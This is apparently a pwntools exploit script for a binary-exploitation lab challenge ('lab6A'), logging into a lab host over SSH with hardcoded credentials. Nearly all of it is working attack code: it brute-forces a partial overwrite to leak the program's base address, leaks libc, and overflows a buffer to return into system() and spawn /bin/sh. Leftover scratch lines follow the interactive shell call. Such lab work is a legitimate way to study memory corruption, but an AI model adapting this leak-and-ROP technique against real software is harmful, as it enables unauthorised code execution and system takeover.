#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.209.13 --user lab6A --pass strncpy_1s_n0t_s0_s4f3_l0l --path /levels/lab06/lab6A
from pwn import *

context.terminal = '/bin/bash'

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab6A')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.209.13'
port = int(args.PORT or 22)
user = args.USER or 'lab6A'
password = args.PASSWORD or 'strncpy_1s_n0t_s0_s4f3_l0l'
remote_path = '/levels/lab06/lab6A'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

MAKE_NOTE = 0x9af
GET_UNUM = 0x91d
SYSCALL   = 0x976
POP_EBP = 0x655

LIBC_SYSTEM = -0x199070

ITEM_NAME = 0x3140

text_base = None


p = log.progress("brute forcing print_name()")

while text_base is None:
    try:
        io = start()

        io.sendline('1')
        io.sendafter('Enter your name:','B' * 32)
#        io.sendline('A' * 86 + 'LEAK' + '\xe2\x1b\x00')
        io.sendline('A' * 86 + 'LEAK' + '\xe2\x5b\x00')

        io.sendlineafter('Enter Choice:','3')

        io.recvuntil('LEAK')
        text_base = io.recv(4)
        text_base = u32(text_base)

        #io.sendline("27")

        #io.sendline('1')
        #io.sendlineafter('Enter your name:','justin')
        #io.sendline(cyclic(115) + '\x7a\00')
        #io.recvuntil('Enter Choice:')
        #io.sendline('3')
        # shellcode = asm(shellcraft.sh())
        # payload = fit({
        #     32: 0xdeadbeef,
        #     'iaaa': [1, 2, 'Hello', 3]
        # }, length=128)
        # io.send(payload)
        # flag = io.recv(...)
        # log.success(flag)

    except EOFError:
        pass

p.success(hex(text_base))
text_base &= 0xfffff000
log.info(".text base: " + hex(text_base))

io.clean()

p = log.progress("leaking libc && overwriting ret w/ make_note()")

io.sendline('1')
io.sendafter('Enter your name:','B' * 32)
io.sendline(cyclic(6) + p32(text_base ^ MAKE_NOTE) + cyclic(114) + 'LEEK' + '\x00')
io.sendlineafter('Enter Choice:','3')

io.recvuntil('LEEK')
libc_base = io.recv(4)
libc_base = u32(libc_base)

p.success("done")
log.info("libc base: " + hex(libc_base))

log.info("setting up system() param")
io.sendlineafter('Enter Choice:','2')
io.sendlineafter("Enter your item's name:","/bin/sh")
io.sendlineafter("Enter your item's price:","3.50")

log.info("ropping system()")
io.sendlineafter('Enter Choice:','4')
io.sendlineafter("Make a Note About your listing...: ", cyclic(52) +                                                        
                                                        p32(libc_base + LIBC_SYSTEM) +                                                       
                                                        "JUNK"+
                                                        p32(text_base + ITEM_NAME )
                )  
io.sendline('/bin/bash')

io.interactive()

io.sendline('1')
io.sendafter('Enter your name:','B' * 32)
io.sendline(cyclic(132) + '\x00')
raw_input("ready to go")
io.sendlineafter('Enter Choice:','3')